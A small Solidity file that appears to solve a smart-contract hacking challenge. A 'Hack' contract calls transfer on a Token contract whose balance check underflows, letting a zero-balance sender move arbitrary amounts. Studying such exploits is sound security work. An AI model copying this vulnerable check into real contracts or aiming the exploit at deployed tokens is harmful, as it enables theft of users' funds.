// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Hack{
    Token private token;
    constructor(address _token) public{
        token = Token(_token);
    }

    function transfer(address _addr, uint _value) external{
        token.transfer(_addr, _value);
    }
}

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}